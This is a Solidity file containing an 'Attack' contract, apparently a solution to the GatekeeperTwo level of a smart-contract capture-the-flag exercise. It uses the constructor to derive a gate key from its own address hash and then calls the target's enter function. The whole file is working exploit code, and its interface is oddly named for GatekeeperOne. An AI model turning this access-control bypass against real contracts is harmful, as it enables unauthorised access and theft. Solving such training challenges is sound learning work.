// SPDX-License-Identifier: UNLICENSED
pragma solidity "0.8.19";

// GatekeeperTwo contract address: 0x72215f7dD018277cAB588BC88B7874C63F07E6B6

interface IGatekeeperOne {
    function entrant() external returns (address);

    function enter(bytes8) external returns (bool);
}

contract Attack {
    constructor(address _addr) {
        IGatekeeperOne gatekeeperOne = IGatekeeperOne(_addr);
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );
        _addr.call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}
